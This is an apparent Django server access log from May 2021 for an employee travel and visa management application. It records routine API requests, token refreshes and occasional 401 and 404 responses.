+INFO|05/May/2021 12:23:06|basehttp|2325|140367419918080|"GET /get_travel_status_summary/?travel_req_id=TR211341&org_id=ORG150866 HTTP/1.1" 200 967
+INFO|05/May/2021 12:23:06|basehttp|2325|140367685498624|"POST /get_vendors_category/ HTTP/1.1" 200 3845
+INFO|05/May/2021 12:23:06|basehttp|2325|140367419918080|"GET /get_add/vendor/?vendor_type=2&org_id=ORG150866 HTTP/1.1" 200 2826
+INFO|05/May/2021 12:23:06|basehttp|2325|140367450076928|"POST /get_vendors_category/ HTTP/1.1" 200 3845
+INFO|05/May/2021 12:23:06|basehttp|2325|140367450076928|"GET /active_taxgrid/?org=ORG150866 HTTP/1.1" 200 9440
+INFO|05/May/2021 12:23:06|basehttp|2325|140367419918080|"GET /get_post_location/?country=United%20States&org_id=ORG150866 HTTP/1.1" 200 838
+INFO|05/May/2021 12:23:06|basehttp|2325|140367685498624|"GET /get_create_assignment/?home=United%20States&End_date=2021-04-23T13:07:33.845000+05:30&Start_date=Fri%20Apr%2023%202021%2000:00:00%20GMT+0530%20(India%20Standard%20Time)&emp_code=tushaar001 HTTP/1.1" 200 63
+INFO|05/May/2021 12:23:06|basehttp|2325|140367685498624|"GET /get_currency_conversion/?from_currency=USD&to_currency= HTTP/1.1" 200 63
+INFO|05/May/2021 12:23:06|basehttp|2325|140367419918080|"GET /get_add/vendor/?vendor_type=2&org_id=ORG150866 HTTP/1.1" 200 2826
+INFO|05/May/2021 12:23:27|basehttp|2325|140367419918080|"GET /employee_chat/?sender_emp_code=div944&receiver_emp_code=VN12&ticket_id=TR211341 HTTP/1.1" 200 55
+INFO|05/May/2021 12:23:54|basehttp|2325|140367450076928|"GET /get_travel_request_approver_top/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866&limit=5 HTTP/1.1" 200 48
+INFO|05/May/2021 12:23:54|basehttp|2325|140367428572928|"GET /post_get_calender_event/?emp_code=div944 HTTP/1.1" 200 48
+INFO|05/May/2021 12:23:55|basehttp|2325|140367441684224|"GET /getemployee_visa_info/?employee=div944 HTTP/1.1" 200 43
+INFO|05/May/2021 12:23:55|basehttp|2325|140367411525376|"GET /getemployee_passport_info/?employee=div944 HTTP/1.1" 200 805
+INFO|05/May/2021 12:23:55|basehttp|2325|140367411525376|"GET /get_travel_count_user/?emp_code=div944 HTTP/1.1" 200 84
+INFO|05/May/2021 12:23:55|basehttp|2325|140367419918080|"GET /org_travel_request/?travel_req_status=2&org_id=ORG150866&current_ticket_email=div944 HTTP/1.1" 200 20141
+INFO|05/May/2021 12:23:56|basehttp|2325|140367685498624|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 43838
+INFO|05/May/2021 12:24:03|basehttp|2325|140367419918080|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 12:24:03|basehttp|2325|140367685498624|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 43838
+INFO|05/May/2021 12:24:04|basehttp|2325|140367419918080|"GET /get_action_status/?module=V HTTP/1.1" 200 1508
+INFO|05/May/2021 12:24:05|basehttp|2325|140367685498624|"GET /get_add/visa_request/?visa_status=2&org_id=ORG150866&emp_email=div944&org_id=ORG150866 HTTP/1.1" 200 22753
+INFO|05/May/2021 12:24:08|basehttp|2325|140367685498624|"GET /get_action_status/?module=V HTTP/1.1" 200 1508
+INFO|05/May/2021 12:24:08|basehttp|2325|140367419918080|"GET /get_action_status/?module=A HTTP/1.1" 200 3670
+INFO|05/May/2021 12:24:08|basehttp|2325|140367441684224|"GET /get_view_visa_request/?visa_req_id=VR129698&org_id=ORG150866 HTTP/1.1" 200 1127
+INFO|05/May/2021 12:24:08|basehttp|2325|140367411525376|"GET /get_visa_status_summary/?visa_req_id=VR129698&org_id=ORG150866 HTTP/1.1" 200 938
+INFO|05/May/2021 12:24:09|basehttp|2325|140367411525376|"GET /visa_master_applicable/?org_id=ORG150866&applicable_country=United%20States&visa_type=Business HTTP/1.1" 200 5771
+INFO|05/May/2021 12:24:56|basehttp|2325|140367411525376|"OPTIONS /api/custom/login/ HTTP/1.1" 200 0
+INFO|05/May/2021 12:24:56|basehttp|2325|140367411525376|"POST /api/custom/login/ HTTP/1.1" 200 463
+INFO|05/May/2021 12:24:57|basehttp|2325|140367411525376|"OPTIONS /emoloyeeinfo/ HTTP/1.1" 200 0
+INFO|05/May/2021 12:24:57|basehttp|2325|140367411525376|"POST /emoloyeeinfo/ HTTP/1.1" 200 1483
+INFO|05/May/2021 12:24:57|basehttp|2325|140367411525376|"OPTIONS /get_post_notification/?email=MST1&org_id=ORG128316 HTTP/1.1" 200 0
+INFO|05/May/2021 12:24:57|basehttp|2325|140367411525376|"OPTIONS /getemployee_org_info/?employee=MST1 HTTP/1.1" 200 0
+INFO|05/May/2021 12:24:57|basehttp|2325|140367411525376|"OPTIONS /get_add/travel_request/?travel_req_status=2&org_id=ORG128316&emp_email=MST1 HTTP/1.1" 200 0
+INFO|05/May/2021 12:24:57|basehttp|2325|140367441684224|"OPTIONS /org_travel_request/?travel_req_status=2&org_id=ORG128316&current_ticket_email=MST1 HTTP/1.1" 200 0
+INFO|05/May/2021 12:24:57|basehttp|2325|140367419918080|"OPTIONS /getemployee_passport_info/?employee=MST1 HTTP/1.1" 200 0
+INFO|05/May/2021 12:24:57|basehttp|2325|140367441684224|"OPTIONS /get_travel_request_approver_top/?emp_email=MST1&travel_req_status=2&type=Travel&org_id=ORG128316&limit=5 HTTP/1.1" 200 0
+INFO|05/May/2021 12:24:57|basehttp|2325|140367441684224|"OPTIONS /getemployee_visa_info/?employee=MST1 HTTP/1.1" 200 0
+INFO|05/May/2021 12:24:57|basehttp|2325|140367441684224|"OPTIONS /post_get_calender_event/?emp_code=MST1 HTTP/1.1" 200 0
+INFO|05/May/2021 12:24:57|basehttp|2325|140367441684224|"OPTIONS /get_travel_count_user/?emp_code=MST1 HTTP/1.1" 200 0
+INFO|05/May/2021 12:24:57|basehttp|2325|140367419918080|"GET /getemployee_org_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:24:58|basehttp|2325|140367441684224|"GET /get_post_notification/?email=MST1&org_id=ORG128316 HTTP/1.1" 200 3414
+INFO|05/May/2021 12:24:58|basehttp|2325|140367419918080|"GET /org_travel_request/?travel_req_status=2&org_id=ORG128316&current_ticket_email=MST1 HTTP/1.1" 200 71
+INFO|05/May/2021 12:24:58|basehttp|2325|140367685498624|"GET /getemployee_passport_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:24:58|basehttp|2325|140367685498624|"GET /get_travel_request_approver_top/?emp_email=MST1&travel_req_status=2&type=Travel&org_id=ORG128316&limit=5 HTTP/1.1" 200 48
+INFO|05/May/2021 12:24:58|basehttp|2325|140367685498624|"GET /getemployee_visa_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:24:58|basehttp|2325|140367419918080|"GET /post_get_calender_event/?emp_code=MST1 HTTP/1.1" 200 48
+INFO|05/May/2021 12:24:58|basehttp|2325|140367685498624|"GET /get_travel_count_user/?emp_code=MST1 HTTP/1.1" 200 82
+INFO|05/May/2021 12:24:58|basehttp|2325|140367411525376|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG128316&emp_email=MST1 HTTP/1.1" 200 12921
+INFO|05/May/2021 12:25:01|basehttp|2325|140367685498624|"OPTIONS /get_action_status/?module=T, HTTP/1.1" 200 0
+INFO|05/May/2021 12:25:01|basehttp|2325|140367685498624|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 12:25:01|basehttp|2325|140367411525376|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG128316&emp_email=MST1 HTTP/1.1" 200 12921
+INFO|05/May/2021 12:25:03|basehttp|2325|140367411525376|"OPTIONS /get_add/visa_request/?visa_status=2&org_id=ORG128316&emp_email=MST1&org_id=ORG128316 HTTP/1.1" 200 0
+INFO|05/May/2021 12:25:03|basehttp|2325|140367411525376|"OPTIONS /get_action_status/?module=V HTTP/1.1" 200 0
+INFO|05/May/2021 12:25:03|basehttp|2325|140367685498624|"GET /get_action_status/?module=V HTTP/1.1" 200 1508
+INFO|05/May/2021 12:25:04|basehttp|2325|140367411525376|"GET /get_add/visa_request/?visa_status=2&org_id=ORG128316&emp_email=MST1&org_id=ORG128316 HTTP/1.1" 200 4685
+INFO|05/May/2021 12:25:07|basehttp|2325|140367411525376|"OPTIONS /get_visa_status_summary/?visa_req_id=VR747504&org_id=ORG128316 HTTP/1.1" 200 0
+INFO|05/May/2021 12:25:07|basehttp|2325|140367419918080|"OPTIONS /get_action_status/?module=A HTTP/1.1" 200 0
+INFO|05/May/2021 12:25:07|basehttp|2325|140367441684224|"OPTIONS /get_view_visa_request/?visa_req_id=VR747504&org_id=ORG128316 HTTP/1.1" 200 0
+INFO|05/May/2021 12:25:07|basehttp|2325|140367685498624|"GET /get_action_status/?module=V HTTP/1.1" 200 1508
+INFO|05/May/2021 12:25:07|basehttp|2325|140367441684224|"GET /get_action_status/?module=A HTTP/1.1" 200 3670
+INFO|05/May/2021 12:25:07|basehttp|2325|140367419918080|"GET /get_view_visa_request/?visa_req_id=VR747504&org_id=ORG128316 HTTP/1.1" 200 1128
+INFO|05/May/2021 12:25:07|basehttp|2325|140367685498624|"GET /get_visa_status_summary/?visa_req_id=VR747504&org_id=ORG128316 HTTP/1.1" 200 955
+INFO|05/May/2021 12:25:08|basehttp|2325|140367685498624|"OPTIONS /visa_master_applicable/?org_id=ORG128316&applicable_country=United%20Kingdom&visa_type=Business HTTP/1.1" 200 0
+INFO|05/May/2021 12:25:08|basehttp|2325|140367685498624|"GET /visa_master_applicable/?org_id=ORG128316&applicable_country=United%20Kingdom&visa_type=Business HTTP/1.1" 200 7492
+INFO|05/May/2021 12:25:20|basehttp|2325|140367411525376|"GET /org_travel_request/?travel_req_status=2&org_id=ORG128316&current_ticket_email=MST1 HTTP/1.1" 200 71
+INFO|05/May/2021 12:25:20|basehttp|2325|140367685498624|"GET /getemployee_visa_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:25:20|basehttp|2325|140367419918080|"GET /get_travel_request_approver_top/?emp_email=MST1&travel_req_status=2&type=Travel&org_id=ORG128316&limit=5 HTTP/1.1" 200 48
+INFO|05/May/2021 12:25:20|basehttp|2325|140367450076928|"GET /getemployee_passport_info/?employee=MST1 HTTP/1.1" 200 43
+INFO|05/May/2021 12:25:20|basehttp|2325|140367428572928|"GET /post_get_calender_event/?emp_code=MST1 HTTP/1.1" 200 48
+INFO|05/May/2021 12:25:20|basehttp|2325|140367428572928|"GET /get_travel_count_user/?emp_code=MST1 HTTP/1.1" 200 82
+INFO|05/May/2021 12:25:20|basehttp|2325|140367441684224|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG128316&emp_email=MST1 HTTP/1.1" 200 12921
+INFO|05/May/2021 12:25:45|basehttp|2325|140367450076928|"GET /get_travel_request_approver_top/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866&limit=5 HTTP/1.1" 200 48
+INFO|05/May/2021 12:25:45|basehttp|2325|140367685498624|"GET /getemployee_visa_info/?employee=div944 HTTP/1.1" 200 43
+INFO|05/May/2021 12:25:45|basehttp|2325|140367419918080|"GET /getemployee_passport_info/?employee=div944 HTTP/1.1" 200 805
+INFO|05/May/2021 12:25:46|basehttp|2325|140367419918080|"GET /post_get_calender_event/?emp_code=div944 HTTP/1.1" 200 48
+INFO|05/May/2021 12:25:46|basehttp|2325|140367685498624|"GET /get_travel_count_user/?emp_code=div944 HTTP/1.1" 200 84
+INFO|05/May/2021 12:25:46|basehttp|2325|140367428572928|"GET /org_travel_request/?travel_req_status=2&org_id=ORG150866&current_ticket_email=div944 HTTP/1.1" 200 20141
+INFO|05/May/2021 12:25:47|basehttp|2325|140367441684224|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 43838
+INFO|05/May/2021 12:25:52|basehttp|2325|140367441684224|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 12:25:53|basehttp|2325|140367428572928|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 43838
+INFO|05/May/2021 12:25:56|basehttp|2325|140367428572928|"OPTIONS /get_add/travel_request/?travel_req_status=3&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 0
+INFO|05/May/2021 12:25:56|basehttp|2325|140367441684224|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 12:25:57|basehttp|2325|140367441684224|"GET /get_add/travel_request/?travel_req_status=3&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 21125
+INFO|05/May/2021 12:27:46|basehttp|2325|140367428572928|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|05/May/2021 12:27:46|basehttp|2325|140367441684224|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 7386
+INFO|05/May/2021 12:27:46|basehttp|2325|140367428572928|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 12:27:47|basehttp|2325|140367441684224|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 43838
+INFO|05/May/2021 12:27:54|basehttp|2325|140367441684224|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 12:27:55|basehttp|2325|140367428572928|"GET /get_add/travel_request/?travel_req_status=3&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 21125
+INFO|05/May/2021 12:28:04|basehttp|2325|140367428572928|"OPTIONS /getassignmentletter/?travel_req_id=TR182975 HTTP/1.1" 200 0
+INFO|05/May/2021 12:28:07|basehttp|2325|140367428572928|"GET /getassignmentletter/?travel_req_id=TR182975 HTTP/1.1" 200 78
+INFO|05/May/2021 12:28:09|basehttp|2325|140367428572928|"OPTIONS /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 12:28:09|basehttp|2325|140367441684224|"OPTIONS /getemployee_org_info/?employee=div944 HTTP/1.1" 200 0
+INFO|05/May/2021 12:28:10|basehttp|2325|140367441684224|"GET /media/Roy_vkMwXiw.png HTTP/1.1" 304 0
+WARNING|05/May/2021 12:28:10|log|2325|140367441684224|Unauthorized: /get_post_notification/
+WARNING|05/May/2021 12:28:10|log|2325|140367428572928|Unauthorized: /getemployee_org_info/
+WARNING|05/May/2021 12:28:10|basehttp|2325|140367441684224|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 401 58
+WARNING|05/May/2021 12:28:10|basehttp|2325|140367428572928|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 401 58
+WARNING|05/May/2021 12:28:39|log|2325|140367428572928|Not Found: /mobilitysqr_staging/uploadpdf/letters_TR182975.zip
+WARNING|05/May/2021 12:28:39|basehttp|2325|140367428572928|"GET /mobilitysqr_staging/uploadpdf/letters_TR182975.zip HTTP/1.1" 404 56334
+WARNING|05/May/2021 12:28:40|log|2325|140367428572928|Not Found: /favicon.ico
+WARNING|05/May/2021 12:28:40|basehttp|2325|140367428572928|"GET /favicon.ico HTTP/1.1" 404 56217
+WARNING|05/May/2021 12:28:51|log|2325|140367428572928|Unauthorized: /get_post_notification/
+WARNING|05/May/2021 12:28:51|basehttp|2325|140367428572928|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 401 58
+WARNING|05/May/2021 12:28:51|log|2325|140367428572928|Unauthorized: /getemployee_org_info/
+WARNING|05/May/2021 12:28:51|basehttp|2325|140367428572928|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 401 58
+WARNING|05/May/2021 12:34:53|log|2325|140367428572928|Unauthorized: /getemployee_org_info/
+WARNING|05/May/2021 12:34:53|log|2325|140367441684224|Unauthorized: /get_post_notification/
+WARNING|05/May/2021 12:34:53|basehttp|2325|140367428572928|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 401 58
+WARNING|05/May/2021 12:34:53|basehttp|2325|140367441684224|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 401 58
+INFO|05/May/2021 12:41:58|basehttp|2325|140367441684224|"GET / HTTP/1.1" 200 45
+INFO|05/May/2021 12:42:15|basehttp|2325|140367441684224|"OPTIONS /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=tushaar001 HTTP/1.1" 200 0
+INFO|05/May/2021 12:42:15|basehttp|2325|140367441684224|"OPTIONS /get_action_status/?module=T, HTTP/1.1" 200 0
+WARNING|05/May/2021 12:42:15|log|2325|140367441684224|Unauthorized: /get_add/travel_request/
+WARNING|05/May/2021 12:42:15|basehttp|2325|140367441684224|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=tushaar001 HTTP/1.1" 401 183
+WARNING|05/May/2021 12:42:15|log|2325|140367441684224|Unauthorized: /get_action_status/
+WARNING|05/May/2021 12:42:15|basehttp|2325|140367441684224|"GET /get_action_status/?module=T, HTTP/1.1" 401 183
+INFO|05/May/2021 12:42:15|basehttp|2325|140367441684224|"OPTIONS /api/token/refresh/ HTTP/1.1" 200 0
+INFO|05/May/2021 12:42:15|basehttp|2325|140367441684224|"OPTIONS /api/token/refresh/ HTTP/1.1" 200 0
+WARNING|05/May/2021 12:42:15|log|2325|140367428572928|Unauthorized: /get_add/travel_request/
+WARNING|05/May/2021 12:42:15|basehttp|2325|140367428572928|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=tushaar001 HTTP/1.1" 401 183
+WARNING|05/May/2021 12:42:15|log|2325|140367428572928|Unauthorized: /get_action_status/
+WARNING|05/May/2021 12:42:15|basehttp|2325|140367428572928|"GET /get_action_status/?module=T, HTTP/1.1" 401 183
+INFO|05/May/2021 12:42:15|basehttp|2325|140367428572928|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|05/May/2021 12:42:15|basehttp|2325|140367428572928|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|05/May/2021 12:42:15|basehttp|2325|140367441684224|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|05/May/2021 12:42:15|log|2325|140367428572928|Unauthorized: /get_add/travel_request/
+WARNING|05/May/2021 12:42:15|basehttp|2325|140367428572928|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=tushaar001 HTTP/1.1" 401 183
+INFO|05/May/2021 12:42:15|basehttp|2325|140367685498624|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|05/May/2021 12:42:15|log|2325|140367441684224|Unauthorized: /get_action_status/
+WARNING|05/May/2021 12:42:15|basehttp|2325|140367441684224|"GET /get_action_status/?module=T, HTTP/1.1" 401 183
+INFO|05/May/2021 12:42:15|basehttp|2325|140367441684224|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|05/May/2021 12:42:15|basehttp|2325|140367685498624|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|05/May/2021 12:42:16|basehttp|2325|140367441684224|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 12:42:20|basehttp|2325|140367428572928|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=tushaar001 HTTP/1.1" 200 228241
+INFO|05/May/2021 12:42:24|basehttp|2325|140367428572928|"OPTIONS /get_add/travel_request/?travel_req_status=3&org_id=ORG150866&emp_email=tushaar001 HTTP/1.1" 200 0
+INFO|05/May/2021 12:42:24|basehttp|2325|140367428572928|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 12:42:24|basehttp|2325|140367428572928|"GET /get_add/travel_request/?travel_req_status=3&org_id=ORG150866&emp_email=tushaar001 HTTP/1.1" 200 8507
+INFO|05/May/2021 12:42:33|basehttp|2325|140367428572928|"OPTIONS /getassignmentletter/?travel_req_id=TR181025 HTTP/1.1" 200 0
+INFO|05/May/2021 12:42:48|basehttp|2325|140367428572928|"GET /getassignmentletter/?travel_req_id=TR181025 HTTP/1.1" 200 78
+INFO|05/May/2021 12:44:46|basehttp|2325|140367428572928|"GET /getassignmentletter/?travel_req_id=TR181025 HTTP/1.1" 200 78
+WARNING|05/May/2021 12:46:16|log|2325|140367428572928|Unauthorized: /getemployee_org_info/
+WARNING|05/May/2021 12:46:16|basehttp|2325|140367428572928|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 401 58
+WARNING|05/May/2021 12:46:16|log|2325|140367428572928|Unauthorized: /get_post_notification/
+WARNING|05/May/2021 12:46:16|basehttp|2325|140367428572928|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 401 58
+INFO|05/May/2021 12:46:57|basehttp|2325|140367428572928|"OPTIONS /get_post_notification/?email=tushaar001&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 12:46:57|basehttp|2325|140367441684224|"OPTIONS /getemployee_org_info/?employee=tushaar001 HTTP/1.1" 200 0
+WARNING|05/May/2021 12:46:57|log|2325|140367428572928|Unauthorized: /get_post_notification/
+WARNING|05/May/2021 12:46:57|basehttp|2325|140367428572928|"GET /get_post_notification/?email=tushaar001&org_id=ORG150866 HTTP/1.1" 401 58
+WARNING|05/May/2021 12:46:57|log|2325|140367685498624|Unauthorized: /getemployee_org_info/
+WARNING|05/May/2021 12:46:57|basehttp|2325|140367685498624|"GET /getemployee_org_info/?employee=tushaar001 HTTP/1.1" 401 58
+INFO|05/May/2021 12:46:57|basehttp|2325|140367441684224|"GET /media/Koala_IEVhUeb.jpg HTTP/1.1" 200 780831
+WARNING|05/May/2021 12:53:36|log|2325|140367441684224|Unauthorized: /get_add/travel_request/
+WARNING|05/May/2021 12:53:36|basehttp|2325|140367441684224|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=tushaar001 HTTP/1.1" 401 183
+WARNING|05/May/2021 12:53:36|log|2325|140367685498624|Unauthorized: /get_action_status/
+WARNING|05/May/2021 12:53:36|basehttp|2325|140367685498624|"GET /get_action_status/?module=T, HTTP/1.1" 401 183
+INFO|05/May/2021 12:53:37|basehttp|2325|140367685498624|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|05/May/2021 12:53:37|log|2325|140367685498624|Unauthorized: /get_add/travel_request/
+INFO|05/May/2021 12:53:37|basehttp|2325|140367441684224|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|05/May/2021 12:53:37|basehttp|2325|140367685498624|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=tushaar001 HTTP/1.1" 401 183
+WARNING|05/May/2021 12:53:37|log|2325|140367685498624|Unauthorized: /get_action_status/
+WARNING|05/May/2021 12:53:37|basehttp|2325|140367685498624|"GET /get_action_status/?module=T, HTTP/1.1" 401 183
+INFO|05/May/2021 12:53:37|basehttp|2325|140367441684224|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|05/May/2021 12:53:37|basehttp|2325|140367428572928|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|05/May/2021 12:53:37|basehttp|2325|140367441684224|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 12:53:41|basehttp|2325|140367685498624|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=tushaar001 HTTP/1.1" 200 228241
+INFO|05/May/2021 12:53:46|basehttp|2325|140367441684224|"GET /get_action_status/?module=T, HTTP/1.1" 200 2108
+INFO|05/May/2021 12:53:46|basehttp|2325|140367685498624|"GET /get_add/travel_request/?travel_req_status=3&org_id=ORG150866&emp_email=tushaar001 HTTP/1.1" 200 8507
+INFO|05/May/2021 12:56:14|basehttp|2325|140367685498624|"GET /getassignmentletter/?travel_req_id=TR181025 HTTP/1.1" 200 78
+INFO|05/May/2021 12:56:30|basehttp|2325|140367685498624|"GET /getassignmentletter/?travel_req_id=TR181025 HTTP/1.1" 200 78
+INFO|05/May/2021 13:58:38|basehttp|2325|140367685498624|"OPTIONS /get_employee_passport/?emp_id=div944 HTTP/1.1" 200 0
+INFO|05/May/2021 13:58:38|basehttp|2325|140367441684224|"OPTIONS /get_active_currency/?status_type=Active HTTP/1.1" 200 0
+INFO|05/May/2021 13:58:38|basehttp|2325|140367428572928|"OPTIONS /get_dial_code/?dial_code= HTTP/1.1" 200 0
+WARNING|05/May/2021 13:58:38|log|2325|140367428572928|Unauthorized: /get_dial_code/
+WARNING|05/May/2021 13:58:38|basehttp|2325|140367428572928|"GET /get_dial_code/?dial_code= HTTP/1.1" 401 183
+WARNING|05/May/2021 13:58:38|log|2325|140367441684224|Unauthorized: /get_employee_passport/
+WARNING|05/May/2021 13:58:38|basehttp|2325|140367441684224|"GET /get_employee_passport/?emp_id=div944 HTTP/1.1" 401 183
+WARNING|05/May/2021 13:58:38|log|2325|140367428572928|Unauthorized: /get_active_currency/
+WARNING|05/May/2021 13:58:38|basehttp|2325|140367428572928|"GET /get_active_currency/?status_type=Active HTTP/1.1" 401 183
+INFO|05/May/2021 13:58:38|basehttp|2325|140367428572928|"OPTIONS /api/token/refresh/ HTTP/1.1" 200 0
+WARNING|05/May/2021 13:58:38|log|2325|140367428572928|Unauthorized: /get_dial_code/
+WARNING|05/May/2021 13:58:38|basehttp|2325|140367428572928|"GET /get_dial_code/?dial_code= HTTP/1.1" 401 183
+INFO|05/May/2021 13:58:38|basehttp|2325|140367441684224|"OPTIONS /api/token/refresh/ HTTP/1.1" 200 0
+WARNING|05/May/2021 13:58:38|log|2325|140367428572928|Unauthorized: /get_employee_passport/
+WARNING|05/May/2021 13:58:38|basehttp|2325|140367428572928|"GET /get_employee_passport/?emp_id=div944 HTTP/1.1" 401 183
+INFO|05/May/2021 13:58:38|basehttp|2325|140367428572928|"OPTIONS /api/token/refresh/ HTTP/1.1" 200 0
+WARNING|05/May/2021 13:58:38|log|2325|140367428572928|Unauthorized: /get_active_currency/
+WARNING|05/May/2021 13:58:38|basehttp|2325|140367428572928|"GET /get_active_currency/?status_type=Active HTTP/1.1" 401 183
+INFO|05/May/2021 13:58:38|basehttp|2325|140367428572928|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|05/May/2021 13:58:38|basehttp|2325|140367428572928|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|05/May/2021 13:58:38|basehttp|2325|140367428572928|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|05/May/2021 13:58:38|basehttp|2325|140367428572928|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|05/May/2021 13:58:38|log|2325|140367441684224|Unauthorized: /get_dial_code/
+WARNING|05/May/2021 13:58:38|basehttp|2325|140367441684224|"GET /get_dial_code/?dial_code= HTTP/1.1" 401 183
+INFO|05/May/2021 13:58:38|basehttp|2325|140367441684224|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|05/May/2021 13:58:38|log|2325|140367441684224|Unauthorized: /get_employee_passport/
+WARNING|05/May/2021 13:58:38|basehttp|2325|140367441684224|"GET /get_employee_passport/?emp_id=div944 HTTP/1.1" 401 183
+INFO|05/May/2021 13:58:38|basehttp|2325|140367428572928|"POST /api/token/refresh/ HTTP/1.1" 200 220
+WARNING|05/May/2021 13:58:38|log|2325|140367428572928|Unauthorized: /get_active_currency/
+WARNING|05/May/2021 13:58:38|basehttp|2325|140367428572928|"GET /get_active_currency/?status_type=Active HTTP/1.1" 401 183
+INFO|05/May/2021 13:58:38|basehttp|2325|140367441684224|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|05/May/2021 13:58:38|basehttp|2325|140367441684224|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|05/May/2021 13:58:38|basehttp|2325|140367428572928|"GET /get_dial_code/?dial_code= HTTP/1.1" 200 57031
+INFO|05/May/2021 13:58:38|basehttp|2325|140367685498624|"GET /get_employee_passport/?emp_id=div944 HTTP/1.1" 200 805
+INFO|05/May/2021 13:58:38|basehttp|2325|140367441684224|"POST /api/token/refresh/ HTTP/1.1" 200 220
+INFO|05/May/2021 13:58:38|basehttp|2325|140367428572928|"GET /get_active_currency/?status_type=Active HTTP/1.1" 200 12552
+INFO|05/May/2021 13:58:41|basehttp|2325|140367428572928|"OPTIONS /get_project/?pid=MTK&limit=15&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 13:58:41|basehttp|2325|140367428572928|"GET /get_project/?pid=MTK&limit=15&org_id=ORG150866 HTTP/1.1" 200 45
+INFO|05/May/2021 13:58:41|basehttp|2325|140367428572928|"GET /get_project/?pid=MTK&limit=15&org_id=ORG150866 HTTP/1.1" 200 45
+INFO|05/May/2021 13:58:41|basehttp|2325|140367428572928|"GET /get_project/?pid=MTK&limit=15&org_id=ORG150866 HTTP/1.1" 200 45
+INFO|05/May/2021 13:58:43|basehttp|2325|140367428572928|"OPTIONS /get_project/?pid=dem&limit=15&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 13:58:43|basehttp|2325|140367428572928|"OPTIONS /get_project/?pid=dem&limit=15&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 13:58:43|basehttp|2325|140367428572928|"GET /get_project/?pid=dem&limit=15&org_id=ORG150866 HTTP/1.1" 200 1212
+INFO|05/May/2021 13:58:44|basehttp|2325|140367428572928|"OPTIONS /get_project/?pid=demo&limit=15&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|05/May/2021 13:58:44|basehttp|2325|140367428572928|"GET /get_project/?pid=dem&limit=15&org_id=ORG150866 HTTP/1.1" 200 1212
